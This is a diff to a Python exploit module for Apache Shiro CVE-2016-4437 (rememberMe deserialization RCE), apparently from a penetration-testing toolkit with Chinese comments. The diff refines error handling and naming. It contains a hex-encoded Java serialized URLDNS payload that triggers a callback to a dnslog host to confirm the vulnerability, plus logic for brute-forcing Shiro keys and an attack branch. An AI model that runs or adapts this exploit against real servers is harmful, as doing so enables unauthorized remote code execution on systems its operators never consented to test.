@@ -47,13 +47,13 @@ class ApacheShiro():
 
     #检测是否存在漏洞
     def cve_2016_4437(self):
-        appName = 'Apache Shiro'
-        pocname = 'CVE-2016-4437'
+        appName = 'ApacheShiro'
+        pocname = 'cve_2016_4437'
         path = '/'
         method = 'post'
         desc = '<= 1.2.4, shiro-550, rememberme deserialization rce'
         #输出类
-        output = Output(self.url, pocname)
+        output = Output(self.url, appName, pocname)
         #请求类
         exprequest = ExpRequest(pocname, output)
         #反序列化利用组件
@@ -255,8 +255,12 @@ class ApacheShiro():
         
         #_verify
         if self.vuln == 'False':
-            dnslog = Dnslog()
-            url0 = dnslog.dns_host()
+            try:
+                dnslog = Dnslog()
+                url0 = dnslog.dns_host()
+            except Exception:
+                print('[-]获取dnslog失败,请确认网络连接!!!')
+                return
             url1 = 'http://' + url0
             payload = 'aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff740010{0}74000071007e0005740004687474707078740017{1}78'.format(binascii.hexlify(url0.encode()).decode(),binascii.hexlify(url1.encode()).decode())
             payload = binascii.a2b_hex(payload)
@@ -302,8 +306,8 @@ class ApacheShiro():
                         #pass
                         output.result_error('%s is incorrect'%key)
                 #验证key的过程中发生异常后,跳过该key
-                except Exception:
-                    output.result_error('%s is skipped'%key)
+                except Exception as e:
+                    output.result_error('%s is skipped %s'%(key,type(e)))
                     continue
             return output.fail('Not found kay')
         #_attack
@@ -341,7 +345,7 @@ def check(**kwargs):
     ExpApacheShiro = ApacheShiro(**kwargs)
     #调用单个函数
     if kwargs['pocname'] != 'ALL':
-        thread_list.append(kwargs['pool'].submit(func = getattr(ExpApacheShiro, kwargs['pocname'])))
+        thread_list.append(kwargs['pool'].submit(getattr(ExpApacheShiro, kwargs['pocname'])))
     #调用所有函数
     else:
         for func in dir(ApacheShiro):
@@ -349,3 +353,5 @@ def check(**kwargs):
                 thread_list.append(kwargs['pool'].submit(getattr(ExpApacheShiro, func)))
     #保存全局子线程列表
     GlobalVar.add_value('thread_list', thread_list)
+
+
